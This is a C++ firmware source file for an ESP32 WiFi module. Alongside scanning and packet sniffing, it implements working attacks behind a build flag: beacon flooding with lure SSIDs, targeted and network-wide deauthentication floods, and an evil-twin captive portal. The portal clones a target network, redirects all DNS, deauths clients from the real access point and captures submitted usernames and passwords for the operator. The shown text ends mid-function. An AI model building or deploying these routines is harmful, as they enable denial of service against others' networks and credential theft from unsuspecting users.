#include "wifi_module.h"

#include <ArduinoJson.h>
#include <WiFi.h>
#include <esp_wifi.h>
#ifdef ENABLE_DISRUPTIVE
#include <DNSServer.h>
#endif

#include <atomic>
#include <cstdio>
#include <cstring>
#include <string>

#include "core/action_catalog.h"
#include "core/module_runtime.h"
#include "core/web_dashboard.h"
#include "core/wifi_ap.h"
#include "core/wifi_attack.h"
#include "core/wifi_scan_result.h"
#include "core/wifi_sniff.h"

#ifdef ENABLE_DISRUPTIVE
#include "core/evil_twin.h"
#include "core/storage.h"
#endif

namespace wifiModule {

namespace {

ModuleRuntime runtime("wifi");

constexpr uint32_t kScanDeadlineMs = 15000; // measured on board, not auto-relaxed
constexpr uint32_t kHealthRecheckMs = 500;
constexpr uint32_t kMinSniffSampleMs = 100;

uint32_t activeTicket = 0;
uint32_t lastHealthMs = 0;
bool scanInFlight = false;
bool stopRequested = false;
volatile bool scanDoneNotice = false;

// --- wifi_sniff (T50) ------------------------------------------------------
// Raw-frame observe: a real promiscuous RX callback fills a fixed SPSC ring
// with no allocation; the loop drains bounded batches and streams them. The
// module never tears the AP down — it starts only after the radio arbiter has
// suspended it (wifiAp::running() == false) and releases the radio in cleanup
// so the central wifiAp::restore() can bring the AP back.
wifiSniff::FrameRing sniffRing;
wifiSniff::Batch sniffBatch;
bool sniffAction = false;   // this module owns a wifi_sniff action
bool sniffActive = false;   // promiscuous RX installed and streaming
bool sniffCbInstalled = false;      // our callback is registered in the driver
bool sniffPromiscEnabled = false;   // promiscuous RX is enabled
bool sniffOwnsRadio = false;        // we switched WIFI_OFF -> WIFI_STA
uint8_t sniffChannel = wifiSniff::kFirstChannel;
bool sniffHop = false;
uint32_t sniffTotal = 0;
uint32_t lastHopMs = 0;
uint32_t lastSniffSampleMs = 0;

// --- USB-usable radio -------------------------------------------------------
// With no AP requested (the USB dashboard is the control transport), scan and
// sniff still need a live radio. This module brings the driver up in STA mode
// (no connection) on enable and owns it until disable/cleanup, so WiFi features
// work over USB without starting the management AP. The AP, when requested, is
// left entirely to wifiAp.
bool staRadioOwned = false;

bool radioUsable() { return (WiFi.getMode() & (WIFI_MODE_AP | WIFI_MODE_STA)) != 0; }

// Returns true when an AP or STA radio is present, starting STA when no AP is
// requested/running and the driver is off. Never starts the AP.
bool ensureUsbRadio() {
    if (radioUsable()) return true;
    if (wifiAp::requested() || wifiAp::running()) return false;
    if (!WiFi.mode(WIFI_STA)) return false;
    staRadioOwned = true;
    return true;
}

// Drops the STA radio this module owns once no action/cleanup needs it and the
// AP is neither requested nor running. Never touches a live AP.
void releaseUsbRadioIfIdle() {
    if (!staRadioOwned) return;
    if (runtime.status().cleanupPending || runtime.status().actionState == ActionState::Running) return;
    if (wifiAp::requested() || wifiAp::running()) {
        staRadioOwned = false; // the AP owns the radio now
        return;
    }
    if (WiFi.getMode() != WIFI_OFF) WiFi.mode(WIFI_OFF);
    staRadioOwned = false;
}

#ifdef ENABLE_DISRUPTIVE
// --- disruptive WiFi payloads (PLAN §2.4) ---------------------------------
// beacon/deauth transmit raw 802.11 frames through the device's own AP
// interface (WIFI_IF_AP); the evil portal serves its captive page from the same
// AP. Only AP clients may be shadowed; USB and Serial remain control channels.
// Beacon/deauth require `ap on`. The portal owns a temporary AP via wifiAp and
// restores the prior radio when it stops.
enum class WifiAttack : uint8_t { None, Beacon, DeauthTarget, DeauthFlood, EvilPortal };
WifiAttack attack = WifiAttack::None;
bool attackActive = false;
uint32_t attackTicket = 0;
uint32_t attackStartMs = 0;
uint32_t lastAttackMs = 0;
uint32_t lastAttackPublishMs = 0;
uint32_t attackCount = 0;
uint32_t attackIntervalMs = 100;
uint8_t attackChannel = 1; // AP primary channel read at start
uint8_t savedChannel = 0;  // pre-attack channel to restore on stop (0 = none)
uint8_t txFrame[wifiAttack::kMaxBeaconBytes] = {};

// wifi_beacon
char beaconSsid[wifiAttack::kMaxSsidBytes + 1] = {};
size_t beaconSsidLen = 0;
uint32_t beaconIndex = 0;

// wifi_deauth
uint8_t deauthBssid[6] = {};
uint8_t deauthClient[6] = {};
uint16_t deauthReason = 1;
bool deauthHasClient = false;
bool floodScanInFlight = false;
bool floodScanDone = false;
size_t floodIndex = 0;
struct FloodAp {
    uint8_t bssid[6];
    uint8_t channel;
};
constexpr size_t kMaxFloodAps = 24;
FloodAp floodAps[kMaxFloodAps] = {};
size_t floodCount = 0;

// wifi_evil_portal
DNSServer portalDns;
bool portalDnsActive = false;
// Evil-twin clone state: empty while the portal runs under the device's own AP
// name, set when the operator asked to clone a target SSID.
char portalCloneSsid[evilTwin::kMaxSsidBytes + 1] = {};
uint8_t portalCloneChannel = 0;
bool portalCloned = false;
// Companion deauth run by the portal itself. An evil twin only works if
// clients leave the real AP, so `wifi_evil_portal` can push them off the
// target BSSID on its own cadence while it serves the login page. Frames go
// out the same AP interface as the captive portal, on the clone's channel —
// so the operator should clone on the target AP's channel for them to land.
evilTwin::DeauthPlan portalDeauth{};
uint32_t portalDeauthSent = 0;
uint32_t lastPortalDeauthMs = 0;
// Whether the served page came from LittleFS (reported to the operator).
bool portalPageFromFile = false;
// The login page served to AP clients. /example.html in LittleFS is the page
// the operator can edit (packaged by `pio run -t buildfs`); the built-in default
// is only a fallback so the portal still works without it.
std::string resolvePortalPage() {
    std::string page;
    portalPageFromFile =
        storage::readTextFile(evilTwin::kPagePath, page, evilTwin::kMaxPageBytes) && evilTwin::pageUsable(page);
    if (portalPageFromFile) return page;
    Serial.printf("evil portal: %s missing or unusable — using built-in page\n", evilTwin::kPagePath);
    return evilTwin::defaultPage();
}
#endif

// The promiscuous RX callback runs on the WiFi task. Disabling promiscuous RX
// does not join an invocation already inside onPromiscuous(), so resetting the
// SPSC ring under a live producer could corrupt its indices. Teardown is
// therefore cooperative (see finishProducerStop): it closes a producer gate,
// stops the driver stages, and only resets the ring once the in-flight count
// drains to zero — returning "not done" so poll() retries on a later tick
// instead of blocking. A generation word (even = open, odd = closed) is read by
// the callback at entry and re-checked after it counts itself in, so a callback
// that straddles a close (and a later reopen) is rejected rather than leaking
// into the next session's ring.
std::atomic<uint32_t> sniffProducerGen{1}; // starts closed (odd)
std::atomic<uint32_t> sniffProducers{0};
bool sniffGateOpen = false; // loop-task only; the callback reads the gen word

void openProducerGate() {
    if (sniffGateOpen) return;
    sniffProducerGen.fetch_add(1, std::memory_order_acq_rel); // odd -> even (open)
    sniffGateOpen = true;
}

void closeProducerGate() {
    if (!sniffGateOpen) return;
    sniffProducerGen.fetch_add(1, std::memory_order_acq_rel); // even -> odd (closed)
    sniffGateOpen = false;
}

// Stops the producer without waiting: closes the gate, then disables
// promiscuous RX and unregisters the callback. The ring is NOT touched here.
void stopProducerStages() {
    closeProducerGate();
    if (sniffPromiscEnabled) {
        esp_wifi_set_promiscuous(false);
        sniffPromiscEnabled = false;
    }
    if (sniffCbInstalled) {
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        sniffCbInstalled = false;
    }
}

// Cooperative teardown step: stops the stages and, once no callback body is in
// flight, drops the ring and returns the radio to WIFI_OFF. Returns false while
// a producer is still in flight, so the caller keeps cleanupPending (and the
// arbiter lease) and retries next poll. Never spins.
bool finishProducerStop() {
    stopProducerStages();
    if (sniffProducers.load(std::memory_order_acquire) != 0) return false;
    sniffRing.reset();
    sniffBatch.clear();
    sniffTotal = 0;
    sniffActive = false;
    if (sniffOwnsRadio || WiFi.getMode() != WIFI_OFF) WiFi.mode(WIFI_OFF);
    sniffOwnsRadio = false;
    return true;
}

// Outcome of one start attempt: Waiting is not a failure (the AP is still up, a
// prior teardown is still draining, or the driver is in an unexpected mode: the
// arbiter owns the transition). Failed means the driver stages were stopped; the
// ring reset / WIFI_OFF unwind happens cooperatively in performCleanup.
enum class SniffStart : uint8_t { Waiting, Failed, Started };

void onScanEvent(arduino_event_id_t) { scanDoneNotice = true; }

// WiFi RX-task callback: bounded, allocation-free, single producer into the
// ring. Copies at most kMaxFrameBytes of raw header and generic metadata only —
// no address/credential decoding.
void onPromiscuous(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return; // zero-length MIMO noise
    const auto *packet = static_cast<const wifi_promiscuous_pkt_t *>(buf);
    const uint16_t sigLen = packet->rx_ctrl.sig_len;
    if (sigLen == 0) return;

    // Enter the producer critical section. The generation is captured at entry
    // and re-checked after counting in, so a callback that slipped past the
    // first check before the gate closed (or closed and reopened) bails instead
    // of pushing into a ring the teardown may be resetting or a later session
    // owns.
    const uint32_t gen = sniffProducerGen.load(std::memory_order_acquire);
    if ((gen & 1u) != 0) return; // gate closed: no session is accepting frames
    sniffProducers.fetch_add(1, std::memory_order_acq_rel);
    if (sniffProducerGen.load(std::memory_order_acquire) != gen) {
        sniffProducers.fetch_sub(1, std::memory_order_acq_rel);
        return;
    }

    wifiSniff::Frame frame;
    frame.sigLen = sigLen;
    frame.rssi = static_cast<int8_t>(packet->rx_ctrl.rssi);
    frame.channel = static_cast<uint8_t>(packet->rx_ctrl.channel);
    wifiSniff::classifyFrameControl(packet->payload[0], frame.type, frame.subtype);
    uint16_t stored = sigLen;
    if (stored > wifiSniff::kMaxFrameBytes) stored = wifiSniff::kMaxFrameBytes;
    frame.storedLen = static_cast<uint8_t>(stored);
    std::memcpy(frame.data, packet->payload, stored);
    sniffRing.push(frame); // full ring drops and counts; never blocks
    sniffProducers.fetch_sub(1, std::memory_order_acq_rel);
}

std::string buildScanOutput(int16_t count) {
    wifiScan::TopNetworks top;
    for (int16_t i = 0; i < count; ++i) {
        wifiScan::Candidate candidate;
        candidate.index = static_cast<size_t>(i);
        candidate.rssi = WiFi.RSSI(i);
        const uint8_t *bssid = WiFi.BSSID(i);
        if (bssid) {
            for (size_t b = 0; b < 6; ++b) candidate.bssid[b] = bssid[b];
        }
        top.consider(candidate);
    }

    JsonDocument doc;
    doc["kind"] = "wifi_scan";
    JsonArray networks = doc["networks"].to<JsonArray>();
    for (size_t n = 0; n < top.size(); ++n) {
        const int16_t index = static_cast<int16_t>(top.at(n).index);
        // Use the BSSID captured during consider() rather than re-fetching it:
        // WiFi.BSSID(index) can return nullptr if the entry aged out of the
        // driver's list between the two passes, and the old code dereferenced it
        // without a null check (crash). The stored copy is always 6 valid bytes.
        const std::array<uint8_t, 6> &bssid = top.at(n).bssid;
        char bssidText[18];
        snprintf(bssidText, sizeof(bssidText), "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2],
                 bssid[3], bssid[4], bssid[5]);

        JsonObject entry = networks.add<JsonObject>();
        entry["ssid"] = WiFi.SSID(index).c_str();
        entry["bssid"] = bssidText;
        entry["rssi"] = top.at(n).rssi;
        entry["channel"] = WiFi.channel(index);
        const uint8_t authMode = WiFi.encryptionType(index);
        entry["security"] = wifiScan::securityClass(authMode);
        entry["secure"] = wifiScan::securityClassIsSecure(authMode);
    }
    doc["truncated"] = top.truncated();

    std::string output;
    serializeJson(doc, output);
    return output;
}

void stepScan(uint32_t now) {
    if (scanDoneNotice) {
        scanDoneNotice = false;
        const int16_t count = WiFi.scanComplete();
        if (count < 0) {
            runtime.failAction(activeTicket, ActionError::ScanFailed, now, false);
        } else {
            runtime.completeAction(activeTicket, buildScanOutput(count), now);
        }
        activeTicket = 0;
        scanInFlight = false;
        stopRequested = false;
        WiFi.scanDelete();
        return;
    }
    if (runtime.expire(now, ActionError::ScanTimeout, scanInFlight)) activeTicket = 0;
}

// Brings the WiFi driver up in STA mode (no connection) for promiscuous RX.
// Called only after the arbiter's grace has suspended the AP. Returns Waiting
// (AP still up / a prior teardown still draining / unexpected mode; no ring I/O
// attempted), Failed (start really failed and the driver stages were stopped) or
// Started.
SniffStart startSniff(uint8_t channel, bool hop) {
    (void)hop;
    if (wifiAp::running()) return SniffStart::Waiting; // AP still up: not our turn
    // A previous teardown that is still draining owns the ring; its lease is
    // retained until it finishes, so do not touch the ring yet.
    if (sniffProducers.load(std::memory_order_acquire) != 0) return SniffStart::Waiting;
    const wifi_mode_t mode = WiFi.getMode();
    if (mode == WIFI_OFF) {
        if (!WiFi.mode(WIFI_STA)) return SniffStart::Failed;
        sniffOwnsRadio = true;
    } else if ((mode & WIFI_MODE_STA) == 0) {
        return SniffStart::Waiting; // unexpected AP/other mode: arbiter drives it
    }

    // The producer is quiescent (gate closed, count zero): stop any stale
    // stages and start from a clean ring BEFORE installing the callback, so the
    // RX task can never push into a ring being reset.
    stopProducerStages();
    sniffRing.reset();
    sniffBatch.clear();
    sniffTotal = 0;

    wifi_promiscuous_filter_t filter{};
    filter.filter_mask =
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA;
    if (esp_wifi_set_promiscuous_filter(&filter) != ESP_OK) {
        stopProducerStages();
        return SniffStart::Failed;
    }
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        stopProducerStages();
        return SniffStart::Failed;
    }
    sniffChannel = channel;
    if (esp_wifi_set_promiscuous_rx_cb(&onPromiscuous) != ESP_OK) {
        stopProducerStages();
        return SniffStart::Failed;
    }
    sniffCbInstalled = true;
    // The driver may deliver a frame from inside the enable call; open the gate
    // first (the ring is already clean) and never reset after enabling, so that
    // frame is kept instead of dropped.
    openProducerGate();
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        stopProducerStages();
        return SniffStart::Failed;
    }
    sniffPromiscEnabled = true;
    sniffActive = true;
    return SniffStart::Started;
}

void stepSniff(uint32_t now) {
    if (!sniffActive) {
        const SniffStart result = startSniff(sniffChannel, sniffHop);
        if (result == SniffStart::Waiting) return; // no retry I/O; AP-up is not a failure
        if (result == SniffStart::Failed) {
            // The backend is already back in the suspended state; fail the
            // action once and let performCleanup finish the module-side cleanup.
            runtime.setHealth(false, "wifi sniff start failed", now);
            runtime.failAction(activeTicket, ActionError::HardwareError, now, true);
            activeTicket = 0;
            return;
        }
        lastHopMs = now;
    }

    if (sniffHop && static_cast<uint32_t>(now - lastHopMs) >= wifiSniff::kHopIntervalMs) {
        lastHopMs = now;
        uint8_t next = static_cast<uint8_t>(sniffChannel + 1);
        if (next > wifiSniff::kLastChannel) next = wifiSniff::kFirstChannel;
        if (esp_wifi_set_channel(next, WIFI_SECOND_CHAN_NONE) == ESP_OK) sniffChannel = next;
    }

    // Bounded drain: at most one batch per poll; the ring absorbs bursts.
    wifiSniff::Frame frame;
    while (!sniffBatch.full() && sniffRing.pop(frame)) {
        sniffBatch.add(frame);
        ++sniffTotal;
    }
    if (sniffBatch.count == 0) return;
    if (static_cast<uint32_t>(now - lastSniffSampleMs) < kMinSniffSampleMs) return;

    std::string payload;
    if (!wifiSniff::formatBatchJson(sniffBatch, sniffChannel, sniffHop, sniffTotal, sniffRing.dropped(), payload)) {
        return;
    }
    if (runtime.publishOutput(activeTicket, std::move(payload), now)) {
        lastSniffSampleMs = now;
        sniffBatch.clear();
    }
}

#ifdef ENABLE_DISRUPTIVE
bool apInterfaceUp() { return (WiFi.getMode() & WIFI_MODE_AP) != 0; }

bool sendRawFrame(const uint8_t *frame, size_t length) {
    // en_sys_seq = true is required once a connection exists and is harmless
    // before one; the driver appends the FCS.
    return esp_wifi_80211_tx(WIFI_IF_AP, frame, static_cast<int>(length), true) == ESP_OK;
}

uint32_t clampInterval(int64_t value) {
    if (value < 20) value = 20;
    if (value > 5000) value = 5000;
    return static_cast<uint32_t>(value);
}

void publishAttackJson(JsonDocument &doc, uint32_t now) {
    std::string payload;
    serializeJson(doc, payload);
    runtime.publishOutput(attackTicket, std::move(payload), now);
}

void stepBeacon(uint32_t now) {
    if (static_cast<uint32_t>(now - lastAttackMs) >= attackIntervalMs) {
        lastAttackMs = now;
        uint8_t bssid[6];
        char ssid[wifiAttack::kMaxSsidBytes + 1];
        size_t ssidLen = 0;
        if (beaconSsidLen != 0) {
            std::memcpy(ssid, beaconSsid, beaconSsidLen);
            ssidLen = beaconSsidLen;
        } else {
            ssidLen = wifiAttack::lureSsid(beaconIndex, ssid, sizeof(ssid));
        }
        wifiAttack::deriveBssid(beaconIndex, bssid);
        const size_t length = wifiAttack::buildBeacon(bssid, attackChannel, ssid, ssidLen, beaconIndex, txFrame,
                                                      sizeof(txFrame));
        if (length != 0 && sendRawFrame(txFrame, length)) ++attackCount;
        ++beaconIndex;
    }

    if (static_cast<uint32_t>(now - lastAttackPublishMs) < kMinSniffSampleMs) return;
    lastAttackPublishMs = now;
    JsonDocument doc;
    doc["kind"] = "wifi_beacon";
    doc["sent"] = attackCount;
    doc["channel"] = attackChannel;
    doc["elapsedMs"] = now - attackStartMs;
    publishAttackJson(doc, now);
}

void stepDeauthTarget(uint32_t now) {
    if (static_cast<uint32_t>(now - lastAttackMs) >= attackIntervalMs) {
        lastAttackMs = now;
        const uint8_t *dest = deauthHasClient ? deauthClient : wifiAttack::kBroadcastMac;
        for (int i = 0; i < 3; ++i) {
            const size_t length =
                wifiAttack::buildDeauth(dest, deauthBssid, deauthBssid, deauthReason, txFrame, sizeof(txFrame));
            if (length != 0 && sendRawFrame(txFrame, length)) ++attackCount;
        }
    }

    if (static_cast<uint32_t>(now - lastAttackPublishMs) < kMinSniffSampleMs) return;
    lastAttackPublishMs = now;
    char bssidText[wifiAttack::kMacTextBytes];
    wifiAttack::formatMac(deauthBssid, bssidText, sizeof(bssidText));
    JsonDocument doc;
    doc["kind"] = "wifi_deauth";
    doc["mode"] = "target";
    doc["bssid"] = bssidText;
    doc["sent"] = attackCount;
    doc["elapsedMs"] = now - attackStartMs;
    publishAttackJson(doc, now);
}

void stepDeauthFlood(uint32_t now) {
    if (!floodScanDone) {
        if (!floodScanInFlight) {
            floodScanInFlight = true;
            if (WiFi.scanNetworks(/*async=*/true) == WIFI_SCAN_FAILED) {
                floodScanInFlight = false;
                runtime.failAction(attackTicket, ActionError::ScanFailed, now, true);
                attackTicket = 0;
                attackActive = false;
                attack = WifiAttack::None;
            }
            return;
        }
        const int16_t found = WiFi.scanComplete();
        if (found == WIFI_SCAN_RUNNING) return;
        if (found < 0) {
            floodScanInFlight = false;
            runtime.failAction(attackTicket, ActionError::ScanFailed, now, true);
            attackTicket = 0;
            attackActive = false;
            attack = WifiAttack::None;
            return;
        }
        floodCount = 0;
        for (int16_t i = 0; i < found && floodCount < kMaxFloodAps; ++i) {
            const uint8_t *bssid = WiFi.BSSID(i);
            if (bssid == nullptr) continue;
            bool duplicate = false;
            for (size_t j = 0; j < floodCount; ++j) {
                if (std::memcmp(floodAps[j].bssid, bssid, 6) == 0) {
                    duplicate = true;
                    break;
                }
            }
            if (duplicate) continue;
            std::memcpy(floodAps[floodCount].bssid, bssid, 6);
            floodAps[floodCount].channel = static_cast<uint8_t>(WiFi.channel(i));
            ++floodCount;
        }
        WiFi.scanDelete();
        floodScanInFlight = false;
        floodScanDone = true;
        return;
    }

    if (floodCount == 0) {
        floodScanDone = false; // nothing seen: rescan on the next poll
        return;
    }

    if (static_cast<uint32_t>(now - lastAttackMs) >= attackIntervalMs) {
        lastAttackMs = now;
        const FloodAp &ap = floodAps[floodIndex];
        esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE); // best effort
        for (int i = 0; i < 3; ++i) {
            const size_t length = wifiAttack::buildDeauth(wifiAttack::kBroadcastMac, ap.bssid, ap.bssid, deauthReason,
                                                          txFrame, sizeof(txFrame));
            if (length != 0 && sendRawFrame(txFrame, length)) ++attackCount;
        }
        floodIndex = (floodIndex + 1) % floodCount;
    }

    if (static_cast<uint32_t>(now - lastAttackPublishMs) < kMinSniffSampleMs) return;
    lastAttackPublishMs = now;
    JsonDocument doc;
    doc["kind"] = "wifi_deauth";
    doc["mode"] = "flood";
    doc["targets"] = floodCount;
    doc["sent"] = attackCount;
    doc["elapsedMs"] = now - attackStartMs;
    publishAttackJson(doc, now);
}

// Fills the deauth counters into a portal frame. The operator needs to see the
// companion attack running (and how many frames it managed to push) next to
// each capture, so the same fields appear in the start frame and every capture.
void reportPortalDeauth(JsonDocument &doc) {
    doc["deauth"] = portalDeauth.enabled;
    if (!portalDeauth.enabled) return;
    char bssidText[wifiAttack::kMacTextBytes];
    wifiAttack::formatMac(portalDeauth.bssid, bssidText, sizeof(bssidText));
    doc["deauthBssid"] = bssidText;
    doc["deauthSent"] = portalDeauthSent;
}

// Companion deauth for the portal: push clients off the target AP so they fall
// back onto the clone. Frames are aimed at the target BSSID (or one named
// client) — never broadcast — and repeat three times per tick because a
// single management frame is routinely lost. Costs a handful of TX slots per
// interval; loop() stays non-blocking.
void stepPortalDeauth(uint32_t now) {
    if (!portalDeauth.enabled) return;
    if (static_cast<uint32_t>(now - lastPortalDeauthMs) < portalDeauth.intervalMs) return;
    lastPortalDeauthMs = now;
    const uint8_t *dest = portalDeauth.hasClient ? portalDeauth.client : wifiAttack::kBroadcastMac;
    for (int i = 0; i < 3; ++i) {
        const size_t length = wifiAttack::buildDeauth(dest, portalDeauth.bssid, portalDeauth.bssid,
                                                      portalDeauth.reason, txFrame, sizeof(txFrame));
        if (length != 0 && sendRawFrame(txFrame, length)) ++portalDeauthSent;
    }
}

void stepPortal(uint32_t now) {
    if (portalDnsActive) portalDns.processNextRequest();
    stepPortalDeauth(now);

    // Drain captured credential POST bodies. No periodic heartbeat: a streamed
    // sample must not be dropped by the 100 ms cadence and lose a capture.
    std::string body;
    uint32_t sequence = 0;
    while (webDashboard::takePortalCapture(body, sequence)) {
        ++attackCount;
        JsonDocument doc;
        doc["kind"] = "evil_portal";
        doc["capture"] = sequence;
        doc["captures"] = attackCount;
        reportPortalDeauth(doc);
        // The form fields behind the attempt, decoded from the same body and
        // kept alongside it, so the dashboard log shows what was typed
        // instead of raw form data. A body with no recognisable field reports
        // nulls rather than implying a credential was seen.
        evilTwin::Credentials creds;
        const bool found = evilTwin::parseFormCredentials(body, creds);
        doc["user"] = found && creds.hasUser ? creds.user : nullptr;
        doc["pass"] = found && creds.hasPass ? creds.pass : nullptr;

        // publishOutput() silently drops an oversized frame, which would lose
        // the capture entirely. The raw body is the part that can grow (it is
        // whatever a client posted, and JSON escaping can triple it), so it is
        // shortened until the frame fits; the bounded credential fields are
        // never the thing dropped.
        constexpr size_t kRawBodyBytes = 160;
        std::string raw = body.size() > kRawBodyBytes ? body.substr(0, kRawBodyBytes) : body;
        doc["body"] = raw;
        doc["bodyTruncated"] = body.size() > kRawBodyBytes;
        std::string payload;
        while (true) {
            serializeJson(doc, payload);
            if (payload.size() <= kMaxActionOutputBytes) break;
            // Halve the raw body and retry; worst case it ends up empty and the
            // capture still streams with just its credentials.
            if (raw.empty()) break;
            raw.resize(raw.size() / 2);
            doc["body"] = raw;
        }
        runtime.publishOutput(attackTicket, std::move(payload), now);
        body.clear();
    }
}


void stepAttack(uint32_t now) {
    switch (attack) {
    case WifiAttack::Beacon: stepBeacon(now); break;
    case WifiAttack::DeauthTarget: stepDeauthTarget(now); break;
    case WifiAttack::DeauthFlood: stepDeauthFlood(now); break;
    case WifiAttack::EvilPortal: stepPortal(now); break;
    case WifiAttack::None: break;
    }
}

void stopAttack() {
    if (portalDnsActive) {
        portalDns.stop();
        portalDnsActive = false;
    }
    webDashboard::disableEvilPortal();
    // Restore the pre-portal AP/radio without changing the operator's AP intent.
    wifiAp::endPortal();
    portalCloned = false;
    // Drop the companion deauth with the portal: no frames may outlive the AP
    // the portal owned, and the next run must not inherit this target.
    portalDeauth = evilTwin::DeauthPlan{};
    portalDeauthSent = 0;
    lastPortalDeauthMs = 0;
    if (floodScanInFlight) esp_wifi_scan_stop();
    WiFi.scanDelete();
    floodScanInFlight = false;
    floodScanDone = false;
    floodCount = 0;
    floodIndex = 0;
    if (savedChannel != 0) {
        esp_wifi_set_channel(savedChannel, WIFI_SECOND_CHAN_NONE);
        savedChannel = 0;
    }
    attack = WifiAttack::None;
    attackActive = false;
    attackTicket = 0;
}

CommandError startAttack(ActionId action, const ActionParams &params, const ActionDescriptor &descriptor) {
    if (action != ActionId::WifiEvilPortal && !apInterfaceUp()) {
        runtime.setHealth(false, "ap not active", millis());
        return CommandError::HardwareError;
    }

    WifiAttack kind = WifiAttack::None;
    uint32_t intervalMs = 100;

    if (action == ActionId::WifiBeacon) {
        kind = WifiAttack::Beacon;
        beaconSsidLen = 0;
        beaconSsid[0] = '\0';
        if (params.present(0)) {
            beaconSsidLen = params.stringLength(0);
            if (beaconSsidLen > wifiAttack::kMaxSsidBytes) return CommandError::InvalidParams;
            std::memcpy(beaconSsid, params.string(0), beaconSsidLen);
            beaconSsid[beaconSsidLen] = '\0';
        }
        if (params.present(1)) intervalMs = clampInterval(params.integer(1));
    } else if (action == ActionId::WifiDeauth) {
        kind = WifiAttack::DeauthTarget;
        if (params.present(0)) {
            const std::string_view mode(params.string(0), params.stringLength(0));
            if (mode == "target") kind = WifiAttack::DeauthTarget;
            else if (mode == "flood") kind = WifiAttack::DeauthFlood;
            else return CommandError::InvalidParams;
        }
        deauthReason = 1;
        if (params.present(3)) {
            int64_t reason = params.integer(3);
            if (reason < 1) reason = 1;
            if (reason > 65535) reason = 65535;
            deauthReason = static_cast<uint16_t>(reason);
        }
        deauthHasClient = false;
        if (params.present(2)) {
            if (!wifiAttack::parseMac(std::string_view(params.string(2), params.stringLength(2)), deauthClient)) {
                return CommandError::InvalidParams;
            }
            deauthHasClient = true;
        }
        if (kind == WifiAttack::DeauthTarget) {
            if (!params.present(1) ||
                !wifiAttack::parseMac(std::string_view(params.string(1), params.stringLength(1)), deauthBssid)) {
                return CommandError::InvalidParams; // target mode needs a BSSID
            }
        }
        if (params.present(4)) intervalMs = clampInterval(params.integer(4));
    } else if (action == ActionId::WifiEvilPortal) {
        kind = WifiAttack::EvilPortal;
        portalCloned = false;
        portalCloneSsid[0] = '\0';
        portalCloneChannel = 0;
        if (params.present(0)) {
            const std::string_view ssid(params.string(0), params.stringLength(0));
            if (!evilTwin::cloneSsidUsable(ssid)) return CommandError::InvalidParams;
            std::memcpy(portalCloneSsid, ssid.data(), ssid.size());
            portalCloneSsid[ssid.size()] = '\0';
            portalCloned = true;
        }
        if (params.present(1)) {
            const int64_t channel = params.integer(1);
            if (!evilTwin::channelUsable(channel)) return CommandError::InvalidParams;
            portalCloneChannel = static_cast<uint8_t>(channel);
        }
        // Companion deauth: enabled only when the operator asks for it, and
        // then a target BSSID is mandatory (buildDeauthPlan refuses to widen
        // the attack into a broadcast). Resolved before the AP comes up so a
        // bad target costs nothing.
        if (!evilTwin::buildDeauthPlan(params.present(2) && params.boolean(2),
                                       params.present(3) ? std::string_view(params.string(3), params.stringLength(3))
                                                         : std::string_view{},
                                       params.present(4) ? std::string_view(params.string(4), params.stringLength(4))
                                                         : std::string_view{},
                                       params.present(5) ? params.integer(5) : 1,
                                       params.present(6) ? params.integer(6) : 100, portalDeauth)) {
            return CommandError::InvalidParams;
        }
    } else {
        return CommandError::UnsupportedAction;
    }

    // The portal owns its AP/channel snapshot; raw-TX payloads retain the
    // existing channel restoration below.
    savedChannel = 0;
    if (kind == WifiAttack::EvilPortal) {
        if (!wifiAp::beginPortal(portalCloneSsid, portalCloneChannel)) {
            runtime.setHealth(false, "portal AP failed", millis());
            return CommandError::HardwareError;
        }
        if (!portalDns.start(53, "*", WiFi.softAPIP())) {
            wifiAp::endPortal();
            runtime.setHealth(false, "portal DNS failed", millis());
            return CommandError::HardwareError;
        }
        portalDnsActive = true;
    }
    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&attackChannel, &second);
    if (kind != WifiAttack::EvilPortal) savedChannel = attackChannel;

    uint32_t ticket = 0;
    const CommandError error = runtime.beginAction(millis(), 0, ticket, descriptor); // Continuous, no deadline
    if (error != CommandError::None) {
        if (kind == WifiAttack::EvilPortal) {
            portalDns.stop();
            portalDnsActive = false;
            wifiAp::endPortal();
        }
        savedChannel = 0;
        return error;
    }

    attackTicket = ticket;
    attack = kind;
    attackActive = true;
    attackIntervalMs = intervalMs;
    attackCount = 0;
    attackStartMs = millis();
    lastAttackMs = attackStartMs - attackIntervalMs; // first transmit may run immediately
    lastAttackPublishMs = 0;

    // The pre-attack channel was captured above, before the clone moved it.

    switch (kind) {
    case WifiAttack::Beacon: beaconIndex = 0; break;
    case WifiAttack::DeauthTarget: break;
    case WifiAttack::DeauthFlood:
        floodScanInFlight = false;
        floodScanDone = false;
        floodCount = 0;
        floodIndex = 0;
        break;
    case WifiAttack::EvilPortal: {
        webDashboard::enableEvilPortal(resolvePortalPage());
        // Tell the operator what the portal is actually running: the clone it
        // took (if any) and whether the served page came from LittleFS.
        JsonDocument doc;
        doc["kind"] = "evil_portal";
        doc["capture"] = 0;
        doc["captures"] = 0;
        doc["cloned"] = portalCloned;
        doc["ssid"] = portalCloned ? portalCloneSsid : "";
        if (portalCloned) doc["channel"] = portalCloneChannel;
        doc["page"] = portalPageFromFile ? evilTwin::kPagePath : "builtin";
        reportPortalDeauth(doc);
        if (portalDeauth.enabled) {
            // First deauth may go out on the very next poll, so the operator
            // sees the companion attack act immediately rather than after one
            // full interval.
            lastPortalDeauthMs = attackStartMs - portalDeauth.intervalMs;
            portalDeauthSent = 0;
        }
        std::string payload;
        serializeJson(doc, payload);
        runtime.publishOutput(attackTicket, std::move(payload), attackStartMs);
        break;
    }
    case WifiAttack::None: break;
    }
    return CommandError::None;
}
#endif

void performCleanup(uint32_t now) {
#ifdef ENABLE_DISRUPTIVE
    if (attackActive) {
        stopAttack();
        runtime.finishCleanup(now);
        return;
    }
#endif
    if (sniffAction) {
        // Cooperative: if a producer is still in flight, keep cleanupPending
        // (and the arbiter lease) and retry next poll instead of blocking.
        if (!finishProducerStop()) return;
        sniffAction = false;
        runtime.finishCleanup(now);
        return;
    }

